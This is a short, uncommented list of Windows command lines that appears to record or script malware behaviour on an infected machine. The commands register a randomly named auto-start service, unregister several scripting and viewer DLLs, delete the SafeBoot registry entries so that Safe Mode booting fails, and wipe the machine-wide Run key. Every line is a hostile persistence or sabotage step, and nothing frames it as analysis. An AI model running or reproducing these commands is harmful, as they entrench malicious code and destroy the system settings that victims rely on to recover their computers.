sc.exe create E7WAMRTJ BinPath= "C:\WINDOWS\system32\E7WAMRTJ.exe -k_ill" type= own type= interact start= auto DisplayName= G08UQ5VYMUW
sc.exe description E7WAMRTJ DMQWEZT3UDJBUV3003LPDNXCUUF5JTBMA8S5HB7NVAP5953E7379OD
regsvr32.exe /u /s scrrun.dll
regsvr32.exe /u /s shimgvw.dll
regsvr32.exe /u /s itss.dll
regsvr32.exe /u /s vbscript.dll
regsvr32.exe /s jscript.dll
reg.exe delete HKLM\SYSTEM\ControlSet001\Control\SafeBoot\Minimal\{4D36E967-E325-11CE-BFC1-08002BE10318} /F
reg.exe delete HKLM\SYSTEM\ControlSet001\Control\SafeBoot\Network\{4D36E967-E325-11CE-BFC1-08002BE10318} /F
reg.exe delete HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot\Minimal\{4D36E967-E325-11CE-BFC1-08002BE10318} /F
reg.exe delete HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot\Network\{4D36E967-E325-11CE-BFC1-08002BE10318} /F
reg.exe delete HKLM\Software\Microsoft\Windows\CurrentVersion\Run /F